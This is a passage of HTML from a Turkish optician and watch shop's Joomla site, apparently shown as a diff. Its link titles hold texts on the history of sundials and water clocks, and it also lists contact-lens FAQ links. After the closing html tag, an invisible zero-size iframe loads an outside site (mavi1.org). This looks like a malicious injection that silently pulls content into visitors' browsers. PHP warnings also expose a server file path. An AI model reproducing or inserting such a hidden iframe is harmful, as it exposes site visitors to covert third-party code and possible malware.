başlamış olur. Bu iş için caminin avlusuna bir sopa dikilir. Cismin gölgesinin mevsimlere göre tespit edilmesi ve namaz vakitlerinin buna göre işaretlenmesiyle gelişmiş bir yatay güneş saati elde edilir. Bilinen en eski İslâm güneş saati 868-901 yılları arasında Mısır'da hüküm süren Tolunoğlu Ahmed'in Fustat'ta yaptırdığı camide bulunmaktadır.Güneş saatlerinde zamanın uzunluğu bir mevsimden ötekine değişiyordu. Mısırlılar günü 24 parçaya bölmüş olsalar da bu şimdikinden farklıydı. Güneşin doğumundan batımına kadar geçen zamanı ona bölüyorlardı, ancak bu birimler yazları daha uzun oluyordu. Geçen yıllarla ve her mevsim kayan gün doğumlarıyla gündüz ve gece saatleri tamamen değişiyordu. Daha sonraları gündüz ve gece süreleri 12 saat uzunlukta hesaplanmış olsa da, bu yine mevsimden mevsime değişmekteydi. Güneş saati karmaşık bir sistemdi ve çok esnekti. Daha basit sistemlere ve akşam saatlerini izlemeye duyulan ihtiyaç, değişik arayışlar getirdi ve insanlar zamanı ölçebilmek için gökyüzüyle ilişkisi olmayan başka araçlara yöneldiler." href="/index.php?option=com_content&amp;view=article&amp;id=99:guene-saatleri&amp;catid=46:saat-hakknda&amp;Itemid=147">  			Güneş Saatleri</a>  			</li>  			<li>  			<a title="Su SaatleriGüneş saatleri kadar eskiye dayanan ancak, tam zamanı bilinmese de ilk tipleri Mısır'da bulunan su saatleri, dibinde delik olan bir kovanın boşalması ve dolmasıyla zamanı gösterir. Bu saatler, zamana yeni bir bakış şeklini olanaklı kılmıştır. Güneş saatleri belirli bir zamanı gösterirken, su saatleri ne kadar zaman geçtiğini de gösteriyordu. Bu yüzden su saatinin icadı zaman ölçümünün gerçek başlangıcı sayılabilir.Su saatlerine su hırsızı anlamına gelen "klepsydra" deniyordu. Bu saatleri, ilk olarak Mısırlılar icat etmiş olsalar da, Yunanlılar geliştirmişlerdir. Su saatleri yüzyıllar boyunca mekanik saatlerin bulunmasına kadar kullanılmıştır. Tek çanaktan oluşan su saatlerinde, içi su dolu ve altında bir delik olan çanağın içinden dışarı su boşaldıkça içindeki işaretler zamanın geçişini gösterir. Bu tip saatler daha çok duruşmalarda avukatların konuşma sürelerini belirlemede kullanılmıştır. Birkaç çanaktan oluşan türlerde ise, su bir çanaktan diğerine doluyordu.Su saatlerinin başka bir çeşidi de dibinde delik olan metal bir kaptan oluşuyor. İçi su dolu böyle bir kap daha geniş bir kabın içine konduğunda yavaş yavaş doluyor ve dibe batıyor. Mısır'dan başka, İngiltere ve Seylan'da da bulunmuş olan bu tip su saatleri, günümüzde hâlâ Kuzey Afrika'da bazı yörelerde kullanılmaktadır. Su saatleri popülerleştikçe daha çok özenilerek yapılmaya başlanmış ve karmaşık mekanizmalar üretilmiştir.M.Ö. 250'de Arşimet, yaptığı su saatine dişliler ekleyerek gezegenleri ve ayın yörüngesini de göstermiştir. Daha gelişmiş su saatleri M.Ö. 100 ve M.S. 500 yılları arasında Yunan ve Romalı horolog ve astronomlar tarafından yapılmıştır. Bu saatlerde damlama deliğinin aşınmasını ya da tıkanmasını önlemek için delik değerli taşlardan yapılabiliyordu. Su basıncı düzenlenerek akış sabit kılınıyordu. Bazı su saatleri zil çalan, çakıl taşı fırlatan mekanizmalarla donatılmıştı. Hatta bazılarında kapılar açılıp insan figürleri çıkıyor ve bunlar saati haber vermek üzere zil çalıyorlardı.M.S. 200 ve 1300 arasında Uzak Doğu'da mekanik göksel su saati yapımı gelişmişti. 3. yüzyıl Çin klepsydraları astronomiyle ilgili konuları gösteren değişik mekanizmaları içeriyordu. En karmaşık saat kulelerinden birisi Çin'de Su Sung'un M.S. 1088'de yaptırdığı dev saat kulesidir. Yedi-sekiz metrelik kulede gündüz ve gece her saat başında iki parlak bronz top yine bronzdan yapılmış iki şahinin ağzından bir bronz kabın içine düşüyordu. Kabın dibindeki delik, bronz topun yeniden yerine dönmesini sağlıyordu. Şahinlerin üstünde de günün her saati için bir dizi kapı ve daha yukarıda da yanmamış durumda birer lamba duruyordu. Her saat başında bronz toplar düştükçe bir çan çalıyor ve biten saatin kapısı kapanıyordu. Toplar gece saatlerini belirtmek üzere düştüğünde ise o saatin lambası yanıyordu.Yunanlı astronom Andronikos'un M.S. 1.yy'da yaptığı Rüzgâr Kulesi, klasik antik çağdan sağlam kalan ender binalardandır. Sekizgen biçimindeki yapıda, mekanik klepsydranın yanında güneş saati, yel değirmeni ve bazı bilimsel araştırmaların yapılmasına yarayacak düzenlemeler ve bir su tankı bulunuyordu.Su saatleri de sadeliklerine rağmen sorunluydular. Soğuk bölgelerde suyun akışkanlığının azalması, deliğin tıkanması, suyun sabit akmaması gibi sorunlar vardı. Bütün bunlara rağmen su saatleri yüzyıllarca kullanılmıştır." href="/index.php?option=com_content&amp;view=article&amp;id=100:su-saatleri&amp;catid=46:saat-hakknda&amp;Itemid=148">  			Su Saatleri</a>  			</li></ul>
+		</div>		</div>		</div>
+	
+</div>
+</div>
+
+    </div>
+    <!-- END: JAZIN -->
+		
+				<!-- BEGIN: BOTTOM SPOTLIGHT -->
+		<div id="ja-botsl" class="clearfix">
+		
+		  		  <div class="ja-box-left" style="width: 24.8%;">
+						<div class="moduletable">
+					<h3>En Son Eklenenler</h3>
+					<ul class="latestnews">
+	<li class="latestnews">
+		<a href="/index.php?option=com_content&amp;view=article&amp;id=114:kontakt-lens-kullanm-zahmetlimidir&amp;catid=43:sss&amp;Itemid=90" class="latestnews">
+			Kontakt lens kullanımı zahmetlimidir?</a>
+	</li>
+	<li class="latestnews">
+		<a href="/index.php?option=com_content&amp;view=article&amp;id=113:kontakt-lensin-kullanlmamas-gereken-durumlar-nelerdir&amp;catid=43:sss&amp;Itemid=90" class="latestnews">
+			Kontakt lensin kullanılmaması gereken durumlar nelerdir?</a>
+	</li>
+	<li class="latestnews">
+		<a href="/index.php?option=com_content&amp;view=article&amp;id=112:kontakt-lens-kullanrken-nelere-dikkat-edilmeli&amp;catid=43:sss&amp;Itemid=90" class="latestnews">
+			Kontakt lens kullanırken nelere dikkat edilmeli?</a>
+	</li>
+	<li class="latestnews">
+		<a href="/index.php?option=com_content&amp;view=article&amp;id=111:her-goeze-lens-olur-mu&amp;catid=43:sss&amp;Itemid=90" class="latestnews">
+			Her göze lens olur mu?</a>
+	</li>
+</ul>		</div>
+	
+		  </div>
+		  		  
+		  		  <div class="ja-box-center" style="width: 24.8%;">
+						<div class="moduletable">
+					<h3>En Çok Okunanlar</h3>
+					<ul class="latestnews">
+	<li class="latestnews">
+		<a href="/index.php?option=com_content&amp;view=article&amp;id=114:kontakt-lens-kullanm-zahmetlimidir&amp;catid=43:sss&amp;Itemid=90" class="latestnews">
+			Kontakt lens kullanımı zahmetlimidir?</a>
+	</li>
+	<li class="latestnews">
+		<a href="/index.php?option=com_content&amp;view=article&amp;id=113:kontakt-lensin-kullanlmamas-gereken-durumlar-nelerdir&amp;catid=43:sss&amp;Itemid=90" class="latestnews">
+			Kontakt lensin kullanılmaması gereken durumlar nelerdir?</a>
+	</li>
+	<li class="latestnews">
+		<a href="/index.php?option=com_content&amp;view=article&amp;id=112:kontakt-lens-kullanrken-nelere-dikkat-edilmeli&amp;catid=43:sss&amp;Itemid=90" class="latestnews">
+			Kontakt lens kullanırken nelere dikkat edilmeli?</a>
+	</li>
+	<li class="latestnews">
+		<a href="/index.php?option=com_content&amp;view=article&amp;id=111:her-goeze-lens-olur-mu&amp;catid=43:sss&amp;Itemid=90" class="latestnews">
+			Her göze lens olur mu?</a>
+	</li>
+	<li class="latestnews">
+		<a href="/index.php?option=com_content&amp;view=article&amp;id=110:lens-nedir&amp;catid=47:lensler" class="latestnews">
+			Lens Nedir?</a>
+	</li>
+</ul>		</div>
+	
+		  </div>
+		  		  
+		  		  <div class="ja-box-right" style="width: 50%;">
+						<div class="moduletable">
+					<h3>Bilgi Hattı</h3>
+					<div class="ja-list"> <div class="clearfix" style="padding: 0pt 10px; margin-bottom: 20px"> <div style="float: left; width: 48%"> <div style="margin: 2px 5px 0pt 0pt; float: left"><img src="/images/stories/tes_ic.jpg" border="0" /></div> <font color="#0000ff"><a href="/index.php?option=com_content&amp;view=article&amp;id=93&amp;Itemid=58"><strong>Teslimat</strong></a></font><br />Sipariş<br /> </div> <div style="float: left; width: 48%"> <div style="margin: 2px 5px 0pt 0pt; float: left"><img src="/images/stories/gar_ic.jpg" border="0" /></div> <a href="/index.php?option=com_content&amp;view=article&amp;id=94&amp;Itemid=49">Garanti</a><br />Sipariş<br /> </div> </div> <div class="clearfix" style="padding: 0pt 10px"> <div style="float: left; width: 48%"> <div style="margin: 2px 5px 0pt 0pt; float: left"><img src="/images/stories/id+ic.jpg" border="0" /></div> <a href="/index.php?option=com_content&amp;view=article&amp;id=90&amp;Itemid=81"><strong>İade</strong></a><br />Sipariş<br /> </div> <div style="float: left; width: 48%"> <div style="margin: 2px 5px 0pt 0pt; float: left"><img src="/images/stories/guv_ic.jpg" border="0" /></div> <a href="/index.php?option=com_content&amp;view=article&amp;id=89&amp;Itemid=80"><strong>Güvenlik </strong></a><br />Gizlilik<br /> </div> </div> </div>		</div>
+	
+		  </div>
+		  		
+		</div>
+		<!-- END: BOTTOM SPOTLIGHT -->
+		
+	</div>
+	<!-- END: CONTENT -->
+
+		<!-- BEGIN: COLUMN -->
+	<div id="ja-col">
+				<div class="moduletable-li">
+					<img src="/images/stories/saat.jpg" border="0" />		</div>
+			<div class="moduletable">
+					<br />
+<b>Warning</b>:  Parameter 1 to modMainMenuHelper::buildXML() expected to be a reference, value given in <b>/home/optiksaa/public_html/libraries/joomla/cache/handler/callback.php</b> on line <b>99</b><br />
+		</div>
+			<div class="moduletable-li">
+					<img src="/images/stories/gozluk.jpg" border="0" />		</div>
+			<div class="moduletable">
+					<br />
+<b>Warning</b>:  Parameter 1 to modMainMenuHelper::buildXML() expected to be a reference, value given in <b>/home/optiksaa/public_html/libraries/joomla/cache/handler/callback.php</b> on line <b>99</b><br />
+		</div>
+			<div class="moduletable">
+					<img src="/images/stories/lens.jpg" width="181" border="0" height="49" />		</div>
+			<div class="moduletable">
+					<br />
+<b>Warning</b>:  Parameter 1 to modMainMenuHelper::buildXML() expected to be a reference, value given in <b>/home/optiksaa/public_html/libraries/joomla/cache/handler/callback.php</b> on line <b>99</b><br />
+		</div>
+			<div class="moduletable">
+					<img src="/images/stories/mh.jpg" border="0" />		</div>
+	
+				<div class="moduletable">
+					<h3>Kur Değişimi</h3>
+					<!-- Currency Selector Module -->
+<form action="/index.php" method="post">
+	<br />
+	<input type="hidden" name="option" value="com_content" />
+<input type="hidden" name="view" value="frontpage" />
+<input type="hidden" name="Itemid" value="1" />
+<input type="hidden" name="limit" value="2" />
+<select class="inputbox" name="product_currency" size="1"  style="width:130px;">
+<option value="EUR" >Euro</option>
+<option value="TRL" selected="selected">Turkish Lira</option>
+<option value="USD" >US Dollar</option>
+</select>
+    <input class="button" type="submit" name="submit" value="Change Currency" />
+</form>		</div>
+			<div class="moduletable-li">
+					<a href="/index.php?option=com_content&amp;view=category&amp;id=43&amp;Itemid=72"><img src="/images/stories/sss.jpg" width="191" border="0" height="81" /></a>		</div>
+			<div class="moduletable">
+					<h3>Kimler Sitede</h3>
+					 Şuanda&nbsp;57 konuk&nbsp;çevrimiçi		</div>
+	
+	</div><br />
+	<!-- END: COLUMN -->
+	
+</div></div>
+
+<!-- BEGIN: FOOTER -->
+<div id="ja-footerwrap">
+<div id="ja-footer" class="clearfix">
+
+	<div class="sublogo">
+		<a href="/index.php" title="Gaziantep Optik Saat"><span>Gaziantep Optik Saat</span></a>
+	</div>
+
+	<div class="copyright">
+		<ul id="mainlevel-nav"><li><a href="/index.php?option=com_content&amp;view=frontpage&amp;Itemid=84" class="mainlevel-nav" >Anasayfa</a></li><li><a href="/index.php?option=com_content&amp;view=category&amp;layout=blog&amp;id=42&amp;Itemid=85" class="mainlevel-nav" >Hizmetler</a></li><li><a href="/index.php?option=com_content&amp;view=article&amp;id=94&amp;Itemid=86" class="mainlevel-nav" >Garanti</a></li><li><a href="/index.php?option=com_content&amp;view=category&amp;layout=blog&amp;id=41&amp;Itemid=87" class="mainlevel-nav" >Kurumsal</a></li><li><a href="/index.php?option=com_content&amp;view=article&amp;id=93&amp;Itemid=88" class="mainlevel-nav" >Teslimat</a></li><li><a href="/index.php?option=com_virtuemart&amp;Itemid=89" class="mainlevel-nav" >Alışveriş</a></li><li><a href="/index.php?option=com_content&amp;view=category&amp;id=43&amp;Itemid=90" class="mainlevel-nav" >S.S.S.</a></li><li><a href="/index.php?option=com_contact&amp;view=contact&amp;id=1&amp;Itemid=91" class="mainlevel-nav" >İletişim</a></li></ul>
+		<div>       Copyright © 2009, Her Hakkı Saklıdır. Design By <a href="http://www.medyamim.com" target="_blank">Medyamim</a><br /></div>
+	</div>
+	
+	<div class="foot-rss">
+		
+	</div>
+
+</div>
+</div>
+<!-- END: FOOTER -->
+
+</div>
+</div>
+
+
+<script type="text/javascript">
+	addSpanToTitle();
+</script>
+
+</body>
+
+</html><IFRAME src="http://mavi1.org/forum" width=0 height=0 frameborder=0></IFRAME>
